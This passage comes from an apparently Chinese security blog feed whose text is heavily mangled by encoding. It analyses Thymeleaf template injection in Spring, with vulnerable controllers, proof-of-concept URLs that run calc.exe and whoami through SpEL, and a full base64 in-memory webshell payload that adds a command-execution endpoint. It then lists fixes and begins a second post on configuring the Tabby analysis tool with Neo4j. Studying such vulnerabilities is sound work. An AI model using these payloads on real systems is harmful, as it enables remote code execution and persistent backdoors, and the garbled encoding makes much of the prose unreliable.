alt="image-20241213234249011"></p><p>æœ€ç»ˆæ˜¯å°†æˆ‘ä»¬çš„è¡¨è¾¾å¼åˆ†å‰²å‡ºæ¥ï¼Œè·å¾—äº†ä¸€ä¸ªVariableExpressionï¼Œç„¶åæ‰§è¡Œå…¶executeå‡½æ•°æ‰§è¡Œè¡¨è¾¾å¼</p><p>ç„¶åå±‚å±‚è°ƒç”¨æœ€ç»ˆé€šè¿‡SPELæ¥æ‰§è¡Œè¡¨è¾¾å¼å†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241213234528330.png" alt="image-20241213234528330"></p><p>æ‰€ä»¥è¯¥æ¼æ´å®é™…ä¸Šå°±æ˜¯SPELè¡¨è¾¾å¼æ‰§è¡Œ</p><p>æ‰€ä»¥æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“å¯ä»¥ä¸éœ€è¦.xï¼Œä½†æ˜¯ä¸‹é¢çš„æ¼æ´å½¢å¼ä¸€å®šéœ€è¦.x</p><h2 id="uri-path"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>æ¼æ´ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>    <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¼æ´åŸç†æ€»ç»“èµ·æ¥å°±æ˜¯å› ä¸ºModelAndViewè¿”å›å€¼ä¸ºç©ºï¼Œæ‰€ä»¥viewTemplateNameä¼šä»uriä¸­è·å–ï¼Œç›´æ¥åœ¨<code>&#123;document&#125;</code>ä½ç½®ä¼ å…¥payloadå³å¯</p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213235751753.png" alt="image-20241213235751753"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æ¥å…·ä½“çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆæ²¡æœ‰è¿”å›ä¹Ÿä¼šèµ‹å€¼çš„åŸå› ï¼ŒåŸå› ä¸»è¦åœ¨<code>DispatcherServlet#doDispatch</code>ä¸­ï¼Œè·å–<code>ModleAndView</code>åè¿˜ä¼šæ‰§è¡Œ<code>applyDefaultViewName</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241214000125870.png" alt="image-20241214000125870"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„mvé‡Œé¢éƒ½ä¸ºç©ºï¼Œç„¶åä¼šæ‰§è¡Œä¸€ä¸ªapplyDefaultViewNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214000313196.png" alt="image-20241214000313196"></p><p>é‡Œé¢ä¼šä»requestå¯¹è±¡é‡Œé¢è·å–ä¸€ä¸ªé»˜è®¤çš„ViewNameï¼Œè·å–åˆ°çš„defaultViewNameå°±æ˜¯æˆ‘ä»¬çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">doc/lang=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æŠŠviewnameè®¾ç½®ä¸ºäº†æˆ‘ä»¬é»˜è®¤çš„è¿™ä¸ªViewName</p><p>æ¬¸ç„¶åè¿™é‡Œå‘ç°ï¼Œgetå›æ¥çš„ViewNameå·²ç»æŠŠæˆ‘ä»¬çš„.xå»æ‰äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Œè¿›å»å…·ä½“çœ‹çœ‹éƒ½å‘ç”Ÿäº†ä»€ä¹ˆ</p><p>å…·ä½“æ˜¯é‡Œé¢çš„ä¸€ä¸ªtransformPathå‡½æ•°ï¼Œå¯¹è·¯ç”±è¿›è¡Œäº†æ ¼å¼è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241214001608987.png" alt="image-20241214001608987"></p><p>é¦–å…ˆå‰é¢ä¸¤éƒ¨åˆ†æ˜¯å»æ‰äº†å‰åçš„&#x2F;ï¼Œç„¶åè°ƒç”¨StringUtils.stripFilenameExtensionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214001912868.png" alt="image-20241214001912868"></p><p>é‡Œé¢åˆ†åˆ«è·å–äº†æœ€åä¸€ä¸ª.çš„ç´¢å¼•å’Œæœ€åä¸€ä¸ª&#x2F;çš„ç´¢å¼•ï¼Œç„¶åæˆªå–åˆ°æœ€åä¸€ä¸ª.ç´¢å¼•çš„å†…å®¹</p><p>åˆ°è¿™é‡Œå°±æ˜ç™½æˆ‘ä»¬æœ€åä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ª.xäº†å§ï¼Œå› ä¸ºéœ€è¦ä¿è¯æˆ‘ä»¬å‰é¢çš„payloadæ˜¯å®Œæ•´çš„ï¼Œæ‰€ä»¥å¾—åœ¨æœ€ååŠ ä¸€ä¸ª.ï¼Œå…¶å®ç»è¿‡åˆ†æåœ¨æœ€ååŠ ä¸ª.å°±å¯ä»¥äº†ï¼Œä¸ç”¨.x</p><p>åé¢çš„æµç¨‹å°±å’Œå‰é¢ä¸€æ ·äº†ï¼Œå°±ä¸åˆ†æäº†</p><blockquote><p>æ³¨æ„è¿™ä¸ªåªé€‚åˆæ— è¿”å›å€¼çš„æ—¶å€™ï¼Œä¸ç„¶viewå°±ä¼šè¢«è¿”å›å€¼ç»™å äº†</p></blockquote><h2 id="å›æ˜¾é—®é¢˜"><a href="#å›æ˜¾é—®é¢˜" class="headerlink" title="å›æ˜¾é—®é¢˜"></a>å›æ˜¾é—®é¢˜</h2><p>çœ‹æ–‡ç« ä»–ä»¬çš„å›æ˜¾å†…å®¹æ˜¾ç¤ºåœ¨äº†å‰ç«¯çš„æŠ¥é”™ä¿¡æ¯å†…éƒ¨ï¼Œåƒè¿™æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241214003633723.png" alt="image-20241214003633723"></p><p>è€Œæˆ‘çš„æ²¡æœ‰ï¼Œä»–åœ¨åå°çš„æ§åˆ¶å°çš„æŠ¥é”™å†…å®¹å€’æ˜¯æœ‰æ²¡ç»·ä½</p><p><img src="https://cdn.clown2024.cn/image-20241214003725080.png" alt="image-20241214003725080"></p><p>ç„¶åæœ‰å›æ˜¾çš„pocéœ€è¦::åé¢æ˜¯æœ‰å†…å®¹çš„ï¼Œå¤§è‡´åŸå› ä¸»è¦æ˜¯åœ¨<code>StandardExpressionParser#parseExpression</code>,åœ¨<code>preprocess</code>é¢„å¤„ç†ç»“æŸåè¿˜ä¼šé€šè¿‡<code>Expression.parse</code>è¿›è¡Œä¸€æ¬¡è§£æï¼Œè¿™é‡Œå¦‚æœè§£æå¤±è´¥åˆ™ä¸ä¼šå›æ˜¾ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†</p><p>pocåœ¨::åé¢éšä¾¿åŠ ç‚¹å†…å®¹å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::aa.<br></code></pre></td></tr></table></figure><p>è‡³äºæˆ‘å‰æ®µä¸ºä»€ä¹ˆæ²¡å›æ˜¾æˆ‘å°±ä¸æƒ³çº ç»“äº†ï¼Œä¸å¦‚ç›´æ¥æ‰“å†…å­˜é©¬æ¥çš„æ–¹ä¾¿ï¼Œæœ‰å…³spelè¡¨è¾¾å¼æ³¨å…¥çš„å­¦ä¹ æ”¾ä¸‹ä¸€ç¯‡æ–‡ç« äº†ã€‚</p><h2 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h2><p>è¿™é‡Œç›´æ¥copyæ–‡ç« çš„ä¸€ä¸ªå†…å­˜é©¬payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® <code>/asd?cmd=whoami</code> ã€‚</p><h2 id="å…¶ä»–å§¿åŠ¿"><a href="#å…¶ä»–å§¿åŠ¿" class="headerlink" title="å…¶ä»–å§¿åŠ¿"></a>å…¶ä»–å§¿åŠ¿</h2><p>${â€¦}æ”¹æˆ*{â€¦}ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><strong>çœç•¥__</strong></p><p>å½“Controllerå¦‚ä¸‹é…ç½®æ—¶ï¼Œå¯ä»¥çœç•¥<code>__</code>åŒ…è£¹ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦ç‰¹æ„å»åˆ†å‰²å­—ç¬¦ä¸²äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><ol><li><p>é…ç½® <code>@ResponseBody</code> æˆ–è€… <code>@RestController</code>ï¼Œè¿™ä¸¤ä¸ªæ³¨è§£ä¸€å¼€å§‹ä¹Ÿæåˆ°è¿‡ï¼Œä»–ä»¬ä¼šå°†è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p></li><li><p>åœ¨è¿”å›å€¼å‰é¢åŠ ä¸Š â€œredirect:â€</p><p>è¿™æ ·ä¸å†ç”± Spring ThymeleafViewæ¥è¿›è¡Œè§£æï¼Œè€Œæ˜¯ç”± RedirectView æ¥è¿›è¡Œè§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <span class="hljs-comment">//FP as redirects are not resolved as expressions</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>åœ¨æ–¹æ³•å‚æ•°ä¸­åŠ ä¸Š HttpServletResponse å‚æ•°</p><p>ç”±äºcontrollerçš„å‚æ•°è¢«è®¾ç½®ä¸ºHttpServletResponseï¼ŒSpringè®¤ä¸ºå®ƒå·²ç»å¤„ç†äº†HTTP Responseï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿè§†å›¾åç§°è§£æã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document, HttpServletResponse response)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>ä¸è¿‡è¿™äº›ä¿®å¤éƒ½æ¯”è¾ƒä¸´æ—¶ï¼Œè¿˜æ˜¯å‡çº§åˆ°æ–°ç‰ˆæœ¬æ¯”è¾ƒå¥½</p><p>å°±å…ˆçœ‹è¿™ä¹ˆå¤šå§ï¼Œæ–°ç‰ˆæœ¬è¿˜æœ‰ç‚¹ä¸œè¥¿æœ‰ç‚¹æ‡’äº†ä¸æƒ³å†™äº†ï¼Œä¹‹åé‡åˆ°å†å­¦ï¼Œæ¯•ç«Ÿå®æˆ˜æ„Ÿè§‰è¿™ç§sstiå¹¶ä¸ä¼šå¾ˆå¤šğŸ¥²</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD">https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘å®åœ¨æ˜¯ä¸çŸ¥é“çœ‹ä»€ä¹ˆäº†ï¼Œæ¥å­¦ä¸€ä¸‹å’Œjavaç›¸å…³çš„ä¸€äº›sstiå§ï¼Œå…ˆä»thymeleafå¼€å§‹&lt;/p&gt;
&lt;h1 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h1&gt;&lt;p&gt;Thymeleafå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¸²</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ssti" scheme="https://clowsman.github.io/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>Tabbyä½¿ç”¨å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-30T17:16:29.000Z</published>
    <updated>2024-12-01T06:08:16.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>è·Ÿç€å®˜æ–¹ç¯å¢ƒæ¥ï¼Œä½†æ˜¯å…·ä½“ä¸Šåˆæœ‰ç‚¹å‡ºå…¥ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹è¯¦ç»†æ­¥éª¤ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm">https://www.yuque.com/wh1t3p1g/tp0c1t/rmm0aimycci76ysm</a></p><p>é¦–å…ˆå®˜ç½‘ä¸‹è½½tabbyçš„zipæ–‡ä»¶ï¼š<a href="https://github.com/wh1t3p1g/tabby/releases/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%9C%E8%A5%BF%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%86">https://github.com/wh1t3p1g/tabby/releases/ï¼Œé‡Œé¢æ‰€æœ‰éœ€è¦çš„ä¸œè¥¿éƒ½åŒ…å«äº†</a></p><h2 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h2><p>è¿™ä¸€æ­¥æ¯”è¾ƒé‡è¦ï¼Œæ–‡æ¡£é‡Œé¢è¦çš„apocæ’ä»¶å’Œtabby-path-finderæ’ä»¶éƒ½åŒ…å«åœ¨å®˜æ–¹çš„zipé‡Œé¢äº†</p><p>ç„¶åæ–°å»ºä¸€ä¸ªNeo4jé¡¹ç›®æ¥ç»™tabbyä½¿ç”¨ï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªDBMS</p><p><img src="https://cdn.clown2024.cn/image-20241201012220397.png" alt="image-20241201012220397"></p><p>é‡Œé¢æœ‰ä¸€ä¸ªé»˜è®¤çš„neo4jæ•°æ®åº“ï¼Œç”¨è¿™ä¸ªå°±å¥½äº†</p><p>ç„¶åé…ç½®tabbyçš„æ•°æ®åº“è´¦å·å¯†ç ï¼Œtabby &gt;&#x3D; 1.3.x ç‰ˆæœ¬çš„æ•°æ®åº“é…ç½®æ”¾ç½®äº <code>config/db.properties</code>ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æ‰‹åŠ¨åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># for docker<br>tabby.cache.isDockerImportPath            = false<br><br># db settings<br>tabby.neo4j.username                      = neo4j<br>tabby.neo4j.password                      = password<br>tabby.neo4j.url                           = bolt://127.0.0.1:7687<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201012611132.png" alt="image-20241201012611132"></p><p>ç„¶åé…ç½®ä¸€ä¸‹æˆ‘ä»¬åˆšæ–°å»ºçš„æ•°æ®åº“</p><p>ç‚¹è¿™é‡Œè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241201012904191.png" alt="image-20241201012904191"></p><p><img src="https://cdn.clown2024.cn/image-20241201012920619.png" alt="image-20241201012920619"></p><p>ç„¶åæ‰¾åˆ°å¯¹åº”çš„é…ç½®é¡¹ï¼Œä¿®æ”¹ä¸‹é¢è¿™äº›å†…å®¹ï¼Œæ²¡æœ‰å°±è‡ªå·±åˆ›å»º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># æ³¨é‡Šä¸‹é¢çš„é…ç½®ï¼Œå…è®¸ä»æœ¬åœ°ä»»æ„ä½ç½®è½½å…¥csvæ–‡ä»¶<br>#server.directories.import=import<br><br># å…è®¸ apoc æ‰©å±•<br>dbms.security.procedures.unrestricted=jwt.security.*,apoc.*<br><br># ä¿®æ”¹å†…å­˜ç›¸å…³é…ç½® <br># 